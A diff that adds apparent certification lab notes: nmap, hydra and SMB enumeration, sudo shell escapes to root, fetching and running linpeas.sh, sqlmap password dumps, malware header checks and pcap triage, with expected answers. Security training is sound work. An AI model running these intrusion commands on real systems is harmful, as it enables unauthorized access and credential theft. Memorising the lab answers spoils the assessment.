@@ -263,9 +263,214 @@ binwalk restricted.txt
 Then try:
 openssl enc -aes-256-cbc -d -a -in restricted.txt -k password
 ---
-
-
-
-
+Discover FTP Hosts:
+nmap -p 21 --open 192.168.0.0/24
+nmap -sV -sC -p 21 192.168.0.25
+Anonymous Login: ftp 192.168.0.25  -- anonymous/anonymous  -- ls
+get Credentials.txt
+bye
+cat Credentials.txt
+Login Fails: hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://192.168.0.25   or
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.0.25
+ftp 192.168.0.25
+get Credentials.txt
+Faster Enumeration: nmap --script ftp-anon,ftp-brute -p 21 192.168.0.25;
+nmap -p 21 --open 192.168.0.0/24   or   nmap -A -p 21 192.168.0.0/24
+nmap -sV -sC -p 21 192.168.0.25
+ftp 192.168.0.25
+ls/ls -la
+get Credentials.txt
+cat Credentials.txt
+---
+Discover SMB Hosts:
+nmap -p 139,445 --open 10.10.55.0/24
+Anonymous Login: smbclient -L //10.10.55.25/ -N
+smbclient //10.10.55.25/Public -N
+ls
+get Sniffer.txt
+exitcat Sniffer.txt
+Login Fails: enum4linux 10.10.55.25
+hydra -l Administrator -P /usr/share/wordlists/rockyou.txt smb://10.10.55.25
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt smb://10.10.55.25
+smbclient //10.10.55.25/Public -U admin
+get Sniffer.txt
+Alternative Enumeration Tools: CrackMapExec
+crackmapexec smb 10.10.55.25
+crackmapexec smb 10.10.55.25 -u admin -p Password123
+nmap --script smb-enum-shares,smb-os-discovery 10.10.55.25;
+nmap -p 139,445 --open 10.10.55.0/24    or   nmap -A -p 139,445 10.10.55.0/24
+smbclient -L //10.10.55.25/ -N
+enum4linux 10.10.55.25
+hydra -L users.txt -P rockyou.txt smb://10.10.55.25
+smbclient //10.10.55.25/Public -U admin
+get Sniffer.txt
+cat Sniffer.txt
+---
+Discover the Ubuntu Machine
+nmap -sV -O 192.168.0.0/24
+ssh smith@192.168.0.15
+Check current privileges: id/whoami/hostname
+sudo -l
+(root) NOPASSWD: /usr/bin/vim :    
+PrivEsc via Vim: sudo vim -c ':!/bin/bash'
+PrivEsc via Less: sudo less /etc/profile
+Locate imroot.txt:  find / -name "imroot.txt" 2>/dev/null
+cat /root/imroot.txt
+Alternative Privilege Escalation
+find / -perm -4000 2>/dev/null
+crontab -l
+ls -la /etc/cron*
+uname -a
+Optional — Use linPEAS
+wget http://YOUR-IP/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+This automates privilege escalation checks.;
+nmap -sV -O 192.168.0.0/24
+ssh smith@192.168.0.15
+sudo -l
+sudo su
+find / -name imroot.txt 2>/dev/null
+cat /root/imroot.txt
+---
+basic malware static analysis/find the executable's Entry
+.Using Detect It Easy:
+Launch DIE
+Open: die-another-da
+Navigate to: PE Information -> Optional Header
+Look for: Entry Point
+Example: Entry Point: 00014FA0
+.Using PEview:
+Open executable
+Navigate:IMAGE_NT_HEADERS
+Open:OPTIONAL HEADER
+Find:AddressOfEntryPoint
+Example:00014FA0
+.Using CFF Explorer:
+Open file
+Go to:NT Headers
+Check:EntryPoint
+.Using Command Line (Linux):
+sudo apt install radare2
+rabin2 -H die-another-da
+Look for:entry
+Example:entry 0x140014fa0
+.Using objdump:
+objdump -f die-another-da
+Example output:start address 0x00014fa0;
+Windows GUI:
+Open DIE or PEview
+Load:die-another-da
+Locate:AddressOfEntryPoint
+Record the hexadecimal address
+Linux CLI:
+rabin2 -H die-another-da   or
+objdump -f die-another-da
+Expected Answer Format usually: 00014FA0 or 0x00014FA0
+---
+malware static analysis
+Verify File Type: file "Strange File-1"
+View Program Headers: readelf -l "Strange File-1"
+Determine Segment Size:
+Field	Meaning
+FileSiz	Size in file
+MemSiz	Size in memory
+Most labs use:FileSiz
+From example:0x001000
+Convert if Needed:
+Decimal value
+Raw hexadecimal
+Example conversions:0x001000 = 4096
+Generate SHA224 Hash: echo -n "0x001000" | sha224sum   or  echo -n "4096" | sha224sum
+Alternativly using rabin2: rabin2 -l "Strange File-1"  or  rabin2 -H "Strange File-1"
+Full Workflow:
+file "Strange File-1"
+readelf -l "Strange File-1"
+Suppose output: FileSiz 0x001000
+Hash it: echo -n "0x001000" | sha224sum
+---
+network forensics: massive DDoS attack
+Open: Wireshark
+Load: attack-traffic.pcapng
+Apply display filter: ip.dst == 10.10.1.10
+Navigate: Statistics → Endpoints → IPv4  or  Statistics → Conversations
+Identify Top Source IP - Sort by: Packets
+Find the source IP with the largest packet count targeting:
+Source IP	Packets
+192.168.1.50	45000   -  largest packet count
+192.168.1.20	1200
+Fast CLI Method: using tshark
+tshark -r attack-traffic.pcapng -Y "ip.dst==10.10.1.10" -T fields -e ip.src | sort | uniq -c | sort -nr;
+Full Workflow:
+Wireshark:
+Open: attack-traffic.pcapng
+Filter: ip.dst == 10.10.1.10
+Open: Statistics → Endpoints
+Sort by packet count
+Record highest source IP
+tshark:
+tshark -r attack-traffic.pcapng -Y "ip.dst==10.10.1.10" -T fields -e ip.src | sort | uniq -c | sort -nr
+---
+network forensics / DDoS traffic analysis
+Open: Wireshark
+Load: Evil-traffic.pcapng
+Apply display filter: ip.dst == 172.22.10.10
+Navigate: Statistics → Endpoints → IPv4  or  Statistics → Conversations
+Determine Packet Counts:
+10.0.0.5	15000
+10.0.0.6	900
+10.0.0.7	45   -   LEAST packet count
+Using: tshark
+tshark -r Evil-traffic.pcapng -Y "ip.dst==172.22.10.10" -T fields -e ip.src | sort | uniq -c | sort -n
+45 10.0.0.7
+900 10.0.0.6
+15000 10.0.0.5;
+---
+SQL injection attack:
+Open: http://cinema.cehorg.com
+.Identify Input Points: 
+Look for:
+Search fields
+Login forms
+URL parameters
+Movie IDs
+Category filters
+Example vulnerable URL: http://cinema.cehorg.com/movie.php?id=5
+.Test for SQL Injection:
+Try adding a single quote: http://cinema.cehorg.com/movie.php?id=5'
+Possible indicators:
+SQL errors
+Broken page
+Different behavior
+Manual SQLi Test: 
+Try:
+' OR '1'='1
+Example: http://cinema.cehorg.com/movie.php?id=5' OR '1'='1
+If the page changes or returns extra data, the parameter may be injectable.
+Capture Request with Burp Suite: 
+Open: Burp Suite
+Enable proxy
+Intercept request
+Send request to Repeater
+Save request to file:
+Example: request.txt
+Use sqlmap: 
+sqlmap -r request.txt --dbs
+sqlmap -r request.txt -D cinema --tables
+sqlmap -r request.txt -D cinema -T users --columns
+Dump Sarah’s Password: sqlmap -r request.txt -D cinema -T users -C username,password --dump
+Faster Targeted Dump: sqlmap -r request.txt -D cinema -T users -C username,password --dump --where="username='Sarah'";
+Full Workflow: 
+sqlmap -u "http://cinema.cehorg.com/movie.php?id=5" --dbs
+sqlmap -u "http://cinema.cehorg.com/movie.php?id=5" -D cinema --tables
+sqlmap -u "http://cinema.cehorg.com/movie.php?id=5" -D cinema -T users --columns
+sqlmap -u "http://cinema.cehorg.com/movie.php?id=5" -D cinema -T users -C username,password --dump
+--- 
+Full Workflow:
+sqlmap -u "http://movies.cehorg.com/movie.php?id=2" --dbs
+sqlmap -u "http://movies.cehorg.com/movie.php?id=2" -D movies --tables
+sqlmap -u "http://movies.cehorg.com/movie.php?id=2" -D movies -T users --columns
+sqlmap -u "http://movies.cehorg.com/movie.php?id=2" --sql-query="SELECT COUNT(*) FROM users"
+---
 
 
